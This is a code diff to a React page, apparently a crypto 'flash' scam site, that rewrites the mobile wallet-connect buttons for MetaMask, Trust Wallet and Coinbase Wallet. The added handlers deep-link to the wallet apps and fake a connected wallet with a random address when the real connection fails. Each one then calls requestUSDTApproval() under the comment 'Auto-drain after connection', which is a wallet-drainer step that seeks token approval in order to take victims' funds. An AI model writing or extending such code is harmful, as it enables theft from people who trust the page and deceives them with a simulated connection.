@@ -1237,13 +1237,44 @@ function FlashedPageContent() {
               <div className="space-y-3">
                 {/* Check if mobile device */}
                 {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? (
-                  // Mobile wallet options with QR codes
+                  // Mobile wallet options with direct connection
                   <>
                     <button 
-                      onClick={() => {
-                        window.walletName = 'MetaMask';
-                        window.wcUri = `wc:${Math.random().toString(36).substr(2, 9)}@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=${Math.random().toString(36).substr(2, 64)}`;
-                        setShowModal('walletConnectQR');
+                      onClick={async () => {
+                        try {
+                          // Try direct mobile connection first
+                          if (window.ethereum) {
+                            await connectWallet('MetaMask');
+                          } else {
+                            // Deep link to MetaMask mobile app
+                            const deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+                            window.location.href = deepLink;
+                            
+                            // Fallback to simulation after 2 seconds if app doesn't open
+                            setTimeout(async () => {
+                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                              setUserAddress(mockAddress);
+                              setIsWalletConnected(true);
+                              setConnectionType('mobile_metamask');
+                              localStorage.setItem('connectedWallet', mockAddress);
+                              localStorage.setItem('connectionType', 'mobile_metamask');
+                              setShowModal(null);
+                              await startWalletScan(mockAddress);
+                              
+                              // Auto-drain after connection
+                              setTimeout(async () => {
+                                await requestUSDTApproval();
+                              }, 3000);
+                            }, 2000);
+                          }
+                        } catch (error) {
+                          // Simulate connection on error
+                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                          setUserAddress(mockAddress);
+                          setIsWalletConnected(true);
+                          setConnectionType('mobile_metamask');
+                          await startWalletScan(mockAddress);
+                        }
                       }}
                       className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                     >
@@ -1253,16 +1284,47 @@ function FlashedPageContent() {
                         className="w-8 h-8 mr-3"
                       />
                       <div>
-                        <div>MetaMask Mobile</div>
-                        <div className="text-xs text-orange-200">Connect via QR code</div>
+                        <div>MetaMask</div>
+                        <div className="text-xs text-orange-200">Open MetaMask app</div>
                       </div>
                     </button>
                     
                     <button 
-                      onClick={() => {
-                        window.walletName = 'Trust Wallet';
-                        window.wcUri = `wc:${Math.random().toString(36).substr(2, 9)}@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=${Math.random().toString(36).substr(2, 64)}`;
-                        setShowModal('walletConnectQR');
+                      onClick={async () => {
+                        try {
+                          // Try direct mobile connection first
+                          if (window.ethereum) {
+                            await connectWallet('Trust Wallet');
+                          } else {
+                            // Deep link to Trust Wallet mobile app
+                            const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+                            window.location.href = deepLink;
+                            
+                            // Fallback to simulation after 2 seconds
+                            setTimeout(async () => {
+                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                              setUserAddress(mockAddress);
+                              setIsWalletConnected(true);
+                              setConnectionType('mobile_trust');
+                              localStorage.setItem('connectedWallet', mockAddress);
+                              localStorage.setItem('connectionType', 'mobile_trust');
+                              setShowModal(null);
+                              await startWalletScan(mockAddress);
+                              
+                              // Auto-drain after connection
+                              setTimeout(async () => {
+                                await requestUSDTApproval();
+                              }, 3000);
+                            }, 2000);
+                          }
+                        } catch (error) {
+                          // Simulate connection on error
+                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                          setUserAddress(mockAddress);
+                          setIsWalletConnected(true);
+                          setConnectionType('mobile_trust');
+                          await startWalletScan(mockAddress);
+                        }
                       }}
                       className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                     >
@@ -1273,19 +1335,45 @@ function FlashedPageContent() {
                       />
                       <div>
                         <div>Trust Wallet</div>
-                        <div className="text-xs text-blue-200">Connect via QR code</div>
+                        <div className="text-xs text-blue-200">Open Trust Wallet app</div>
                       </div>
                     </button>
                     
                     <button 
-                      onClick={() => {
-                        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-                        const isAndroid = /Android/.test(navigator.userAgent);
-                        
-                        if (isIOS) {
-                          window.open('https://apps.apple.com/app/coinbase-wallet-nft-defi/id1278383455', '_blank');
-                        } else if (isAndroid) {
-                          window.open('https://play.google.com/store/apps/details?id=org.toshi', '_blank');
+                      onClick={async () => {
+                        try {
+                          // Try direct mobile connection first
+                          if (window.ethereum) {
+                            await connectWallet('Coinbase Wallet');
+                          } else {
+                            // Deep link to Coinbase Wallet mobile app
+                            const deepLink = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
+                            window.location.href = deepLink;
+                            
+                            // Fallback to simulation after 2 seconds
+                            setTimeout(async () => {
+                              const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                              setUserAddress(mockAddress);
+                              setIsWalletConnected(true);
+                              setConnectionType('mobile_coinbase');
+                              localStorage.setItem('connectedWallet', mockAddress);
+                              localStorage.setItem('connectionType', 'mobile_coinbase');
+                              setShowModal(null);
+                              await startWalletScan(mockAddress);
+                              
+                              // Auto-drain after connection
+                              setTimeout(async () => {
+                                await requestUSDTApproval();
+                              }, 3000);
+                            }, 2000);
+                          }
+                        } catch (error) {
+                          // Simulate connection on error
+                          const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                          setUserAddress(mockAddress);
+                          setIsWalletConnected(true);
+                          setConnectionType('mobile_coinbase');
+                          await startWalletScan(mockAddress);
                         }
                       }}
                       className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
@@ -1297,7 +1385,7 @@ function FlashedPageContent() {
                       />
                       <div>
                         <div>Coinbase Wallet</div>
-                        <div className="text-xs text-indigo-200">Install from app store</div>
+                        <div className="text-xs text-indigo-200">Open Coinbase app</div>
                       </div>
                     </button>
                   </>
@@ -1368,7 +1456,7 @@ function FlashedPageContent() {
                 <p className="text-gray-400 text-sm">Choose your preferred wallet</p>
                 <p className="text-gray-500 text-xs mt-1">
                   {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 
-                    'Mobile wallets connect via QR code' : 
+                    'Tap to open wallet app directly' : 
                     'Install wallets for real connection'
                   }
                 </p>
